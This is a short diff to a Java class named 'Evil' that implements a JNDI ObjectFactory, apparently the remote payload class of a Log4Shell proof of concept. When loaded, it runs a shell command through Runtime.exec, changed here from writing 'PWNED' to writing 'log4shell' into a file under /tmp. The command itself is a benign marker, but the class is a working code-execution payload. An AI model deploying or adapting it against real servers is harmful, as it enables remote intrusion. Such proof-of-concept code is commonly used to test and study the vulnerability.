@@ -5,11 +5,12 @@ import java.util.Hashtable;
 
 public  class Evil implements  ObjectFactory  {
     @Override
-    public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
+    public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)
+            throws Exception {
         String[] cmd = {
             "/bin/sh",
             "-c",
-            "echo PWNED > /tmp/pwned"
+            "echo log4shell > /tmp/log4j"
         };
         Runtime.getRuntime().exec(cmd);
         return  null;
